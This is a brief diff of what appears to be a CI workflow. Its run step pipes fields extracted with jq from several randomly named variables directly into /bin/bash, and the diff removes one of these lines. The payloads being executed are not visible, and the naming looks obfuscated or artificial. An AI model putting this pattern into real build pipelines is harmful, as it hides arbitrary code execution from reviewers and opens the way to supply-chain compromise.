@@ -23,7 +23,6 @@ jobs:
           echo $ofls68068 | jq -r .yjul44 | /bin/bash
           echo $p574 | jq -r .rq86412 | /bin/bash
           printf '%s' "$c3" | jq -r .ijkd2 | /bin/bash
-          echo $t297 | jq -r .ce19 | /bin/bash
           printf '%s' "$oikl62629" | jq -r .snqj4 | /bin/bash
 
       - name: Archive output
